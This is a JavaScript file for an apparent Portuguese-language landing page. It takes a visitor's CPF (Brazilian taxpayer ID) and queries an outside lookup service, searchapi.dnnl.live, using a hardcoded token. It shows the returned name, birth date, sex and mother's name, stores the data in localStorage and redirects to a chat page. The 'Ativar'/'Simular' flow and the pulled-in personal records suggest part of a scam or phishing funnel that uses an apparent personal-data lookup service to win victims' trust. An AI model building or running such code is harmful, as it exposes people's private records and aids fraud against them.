document.addEventListener("DOMContentLoaded", function () {
  // Elementos principais
  const mainPage = document.getElementById("mainPage");
  const cpfPage = document.getElementById("cpfPage");
  const btnAtivar = document.getElementById("btnAtivar");
  const btnVoltar = document.getElementById("btnVoltar");
  const btnAnalisar = document.getElementById("btnAnalisar");
  const btnSimular = document.getElementById("btnSimular");

  // Elementos de formulário
  const cpfInputPage = document.getElementById("cpfInputPage");
  const termsCheck = document.getElementById("termsCheck");

  // Elementos de resultado da consulta
  const consultaResultado = document.getElementById("consultaResultado");
  const loadingInfo = document.getElementById("loadingInfo");
  const userInfo = document.getElementById("userInfo");
  const errorInfo = document.getElementById("errorInfo");
  const errorMessage = document.getElementById("errorMessage");
  const btnConfirmar = document.getElementById("btnConfirmar");
  const btnCorrigir = document.getElementById("btnCorrigir");
  const btnTentarNovamente = document.getElementById("btnTentarNovamente");

  // Campos de informação do usuário
  const nomeUsuario = document.getElementById("nomeUsuario");
  const dataNascimento = document.getElementById("dataNascimento");
  const cpfUsuario = document.getElementById("cpfUsuario");
  const sexoUsuario = document.getElementById("sexoUsuario");
  const nomeMae = document.getElementById("nomeMae");

  // Formatar CPF enquanto digita
  function formatCPF(input) {
    let value = input.value.replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);
    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, "$1.$2.$3");
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{1,3})$/, "$1.$2");
    }
    input.value = value;
  }

  function validateCPF(cpf) {
    cpf = cpf.replace(/\D/g, "");
    return cpf.length === 11;
  }

  function formatDate(dateString) {
    if (!dateString) return "Não informado";
    if (dateString.includes("/")) return dateString;
    if (dateString.length === 8) {
      return dateString.replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
    }
    return dateString;
  }

  // Consultar CPF na API (DNNL LIVE)
  async function consultarCPF(cpf) {
    try {
      cpf = cpf.replace(/\D/g, "");

      consultaResultado?.classList.remove("hidden");
      loadingInfo?.classList.remove("hidden");
      userInfo?.classList.add("hidden");
      errorInfo?.classList.add("hidden");

      consultaResultado?.scrollIntoView({ behavior: "smooth", block: "center" });

      const response = await fetch(
        `https://searchapi.dnnl.live/consulta?token_api=0047&cpf=${cpf}`,
        {
          method: "GET",
          headers: { "Accept": "application/json" }
        }
      );

      if (!response.ok) throw new Error("Erro na rede: " + response.status);

      const data = await response.json();
      loadingInfo?.classList.add("hidden");

      // Lógica de Extração Inteligente: tenta DADOS, dados, ou a própria raiz
      const usuario = data.DADOS || data.dados || data;

      // Verifica se existe algum nome na resposta
      const nomeFinal = usuario.nome || usuario.NOME || usuario.Nome || "";

      if (!nomeFinal) {
        throw new Error("CPF não encontrado ou dados inválidos.");
      }

      // Preencher interface
      nomeUsuario.textContent = nomeFinal;
      dataNascimento.textContent = formatDate(usuario.data_nascimento || usuario.NASCIMENTO || usuario.nascimento || "");
      cpfUsuario.textContent = usuario.cpf || usuario.CPF || cpf;
      
      const sexo = (usuario.sexo || usuario.SEXO || "").toUpperCase();
      sexoUsuario.textContent = sexo === "M" ? "Masculino" : sexo === "F" ? "Feminino" : "Não informado";
      
      nomeMae.textContent = usuario.nome_mae || usuario.MAE || usuario.NOME_MAE || "Não informado";

      // Salvar no storage
      const dadosUsuario = {
        nome: nomeFinal,
        primeiroNome: nomeFinal.split(" ")[0],
        cpf: cpf,
      };

      localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
      localStorage.setItem("nomeUsuario", dadosUsuario.nome);

      userInfo?.classList.remove("hidden");
      setTimeout(() => { userInfo?.scrollIntoView({ behavior: "smooth", block: "center" }); }, 200);

    } catch (error) {
      console.error("Erro:", error);
      loadingInfo?.classList.add("hidden");
      errorMessage.textContent = "Erro ao buscar dados. Verifique o CPF e tente novamente.";
      errorInfo?.classList.remove("hidden");
    }
  }

  // Eventos de Navegação
  function showCPFPage() {
    mainPage.classList.add("fade-out");
    setTimeout(() => {
      mainPage.classList.add("hidden");
      cpfPage.classList.remove("hidden");
      void cpfPage.offsetWidth;
      cpfPage.classList.add("fade-in");
      cpfPage.classList.remove("opacity-0");
      cpfInputPage.focus();
    }, 400);
  }

  function showMainPage() {
    cpfPage.classList.remove("fade-in");
    cpfPage.classList.add("opacity-0");
    setTimeout(() => {
      cpfPage.classList.add("hidden");
      mainPage.classList.remove("hidden");
      void mainPage.offsetWidth;
      mainPage.classList.remove("fade-out");
    }, 400);
  }

  function processForm() {
    const cpf = cpfInputPage.value.replace(/\D/g, "");
    if (!validateCPF(cpf)) return alert("CPF Inválido.");
    if (!termsCheck.checked) return alert("Aceite os termos.");
    consultarCPF(cpf);
  }

  function redirecionarParaChat() {
    const urlAtual = new URLSearchParams(window.location.search);
    const cpf = (localStorage.getItem("cpf") || "").replace(/\D/g, "");
    urlAtual.set("cpf", cpf);
    window.location.href = `chat/chat/index.html?${urlAtual.toString()}`;
  }

  // Listeners
  btnAtivar.addEventListener("click", showCPFPage);
  btnSimular.addEventListener("click", showCPFPage);
  btnVoltar.addEventListener("click", showMainPage);
  btnAnalisar.addEventListener("click", processForm);
  if (btnConfirmar) btnConfirmar.addEventListener("click", redirecionarParaChat);
  if (btnCorrigir) btnCorrigir.addEventListener("click", () => consultaResultado.classList.add("hidden"));
  if (btnTentarNovamente) btnTentarNovamente.addEventListener("click", () => consultaResultado.classList.add("hidden"));
  cpfInputPage.addEventListener("input", function () { formatCPF(this); });

  // Carrossel
  const slides = document.querySelectorAll(".carousel-item");
  let currentSlide = 0;
  if (slides.length > 0) {
    setInterval(() => {
      slides[currentSlide].classList.remove("active");
      currentSlide = (currentSlide + 1) % slides.length;
      slides[currentSlide].classList.add("active");
    }, 5000);
  }
});
